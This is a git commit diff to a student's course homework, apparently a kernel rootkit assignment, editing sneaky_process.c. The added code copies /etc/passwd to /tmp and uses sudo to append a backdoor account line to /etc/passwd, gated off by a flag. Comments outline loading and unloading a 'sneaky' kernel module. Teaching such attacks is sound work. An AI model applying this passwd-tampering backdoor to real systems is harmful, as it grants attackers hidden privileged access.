43f0249f8d5e18d0c93a2cf9ec1a7d330c15ca5d
Benjamin Flowers <bcf13@duke.edu>
2019-04-09 22:09:21 -0400

    .

--- homework5-kit/sneaky_process.c
+++ homework5-kit/sneaky_process.c
@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <stdlib.h>
 
+#define COPY_PWD 0
 
 
 int main()
@@ -12,11 +13,36 @@ int main()
 	int pid = getpid(); 
 	int status; 
 
-	// #1
+	// #1: Your program should print its own process ID to the screen
 	printf("sneaky_process pid = %d\n", pid);
 
-	// #2 
-	status=system("ls");
+	if (COPY_PWD) 
+	{
+
+	// #2: Copy the /etc/passwd to /tmp/passwd and append new credential to /etc/passwd
+	status=system("cp /etc/passwd /tmp/passwd");
+
+	
+	status=system("sudo bash -c \"echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd\"");
+	}
+
+
+	// #3: Load the sneaky module (sneaky_mod.ko) using “insmod” command
+
+
+	// #4: enter a loop, reading characters from keyboard until receiving 'q'
+	int more=1; 
+	char letter; 
+	
+	while (more)
+	{
+		scanf("%c", &letter);
+		if (letter=='q') more=0; 
+	}
+
+	// #5: Unload the sneaky kernel module using the “rmmod” command
+
+	// #6: Restore the /etc/passwd file by copying /tmp/passwd to /etc/passwd
 
 
 
